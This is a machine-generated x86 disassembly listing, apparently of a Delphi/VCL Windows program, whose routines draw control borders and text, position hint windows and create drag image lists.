mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43ac01
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43a828
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4349d8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43ac40
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43585c
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4332d8
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43ac88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_435a7c
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43acb8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43a474
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_436a08
xor ecx ecx
push ebp
push sub_43ade7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_436ea0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43adee
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436e64
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43adee
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4032ec
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4032ec
jmp r-xdata
sub_43ae84
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_434b3c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_434b3c
sub_43aec8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_434b3c
sub_43af18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43afa8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43b20e
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d358
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_428284
call sub_428364
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_428284
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42897c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43b250
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4334b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_437a5c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_434b3c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_435d00
sub_43b2bc
push ebx
push esi
mov esi edx
call sub_44a5dc
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406754
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_434b3c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406754
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_434b3c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43b320
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_437e24
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43b358
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43b350
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b398
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43bc8c
mov edx 0x80ffff
mov eax esi
call sub_433b10
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d9fc
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d440
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43b404
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_436ffc
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40b9f0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_436f94
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43b470
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43b4c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b4cd
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ReleaseDC
retn
sub_43b4d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43b56d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41cb58
mov eax ebx
call sub_435ca8
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x14 ]
call sub_40436c
push eax
mov eax [ ebx + 0x208 ]
call sub_41dadc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b574
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
sub_43b57c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43b5e8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_43b673
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b67a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_433970
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d93c
mov edx eax
add edx 0x6
mov eax esi
call sub_43312c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_433970
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d958
mov edx eax
add edx 0x4
mov eax esi
call sub_433150
sub_43b680
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43b859
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4339a0
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_434be0
mov eax [ esi ]
call sub_450e14
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_450e20
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_450e14
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_450e08
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_450e20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_450dfc
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_450e08
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_450dfc
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4378a4
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b860
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40416c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_43e8d4
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call [ rw-data ]
sub_43b868
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43b890
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41242c
mov eax esi
call sub_435ca8
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ esi + 0x208 ]
call sub_41dadc
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43b8ec
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41242c
call sub_428284
call sub_428364
test al al
jne r-xdata
call sub_428284
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_4285f0
push esp
push 0x1
push 0xf
push 0x0
call sub_428284
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_4283d4
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43b958
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4381ac
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43b97c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43b9bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ba7c
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422800
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422800
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
